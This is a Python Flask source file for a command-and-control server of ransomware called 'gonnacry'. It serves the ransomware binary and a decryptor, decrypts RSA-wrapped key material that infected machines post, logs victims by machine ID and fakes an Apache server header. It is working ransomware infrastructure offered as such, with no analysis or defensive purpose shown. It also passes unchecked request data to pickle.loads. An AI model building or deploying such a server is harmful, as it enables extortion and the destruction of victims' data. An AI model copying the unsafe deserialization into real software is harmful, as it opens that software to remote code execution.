from flask import Flask, request, Response, send_file
import os
import base64
import pickle
import logging
from datetime import datetime, timezone
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

binaries_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'binaries')

headers = {'Server': 'Apache/2.4.41 (Ubuntu)'}

with open("private_key.key") as f:
    private_key = f.read()

# Logging — file + stdout so journalctl also shows events
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[
        logging.FileHandler("c2.log"),
        logging.StreamHandler(),
    ]
)
log = logging.getLogger("c2")


def c2log(event, **kwargs):
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    src = request.remote_addr
    fields = " ".join(f"{k}={v}" for k, v in kwargs.items())
    log.info(f"[{ts}] {event} src={src} {fields}".strip())


app = Flask("gonnacry-c2")


@app.errorhandler(404)
def page_not_found(error):
    return Response("Not Found", status=404, headers=headers)


@app.errorhandler(500)
def internal_error(error):
    return Response("Internal Server Error", status=500, headers=headers)


@app.route("/download-gonnacry/", methods=["GET"])
def download_gonnacry():
    binary = os.path.join(binaries_dir, 'gonnacry')
    if not os.path.isfile(binary):
        c2log("DOWNLOAD-GONNACRY", status="404_not_built")
        return Response("Not available.", status=404, headers=headers)
    c2log("DOWNLOAD-GONNACRY", status="OK")
    return send_file(binary, mimetype='application/octet-stream',
                     as_attachment=True, download_name='gonnacry')


@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    binary = os.path.join(binaries_dir, 'decryptor')
    if not os.path.isfile(binary):
        c2log("DOWNLOAD-DECRYPTOR", status="404_not_built")
        return Response("Not available.", status=404, headers=headers)
    c2log("DOWNLOAD-DECRYPTOR", status="OK")
    return send_file(binary, mimetype='application/octet-stream',
                     as_attachment=True, download_name='decryptor')


@app.route("/decrypt/", methods=['POST'])
def decrypt():
    machine_id = request.headers.get("X-Machine-ID", "unknown")
    data = request.data
    if not data:
        c2log("DECRYPT", machine_id=machine_id, status="411_no_data")
        return Response("No content.", status=411, headers=headers)

    try:
        enc_list = pickle.loads(base64.b64decode(data))
    except Exception:
        c2log("DECRYPT", machine_id=machine_id, status="415_bad_format")
        return Response('Wrong format.', status=415, headers=headers)

    rsa_key = RSA.importKey(private_key)
    cipher = PKCS1_OAEP.new(rsa_key)
    try:
        decrypted = b""
        for chunk in enc_list:
            decrypted += cipher.decrypt(chunk)
    except Exception:
        c2log("DECRYPT", machine_id=machine_id, status="400_wrong_key")
        return Response("Decryption failed — wrong private key?", status=400, headers=headers)

    c2log("DECRYPT", machine_id=machine_id, status="OK")
    return Response(decrypted, status=200, headers=headers)


@app.route("/")
def index():
    return Response("", status=200, headers=headers)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
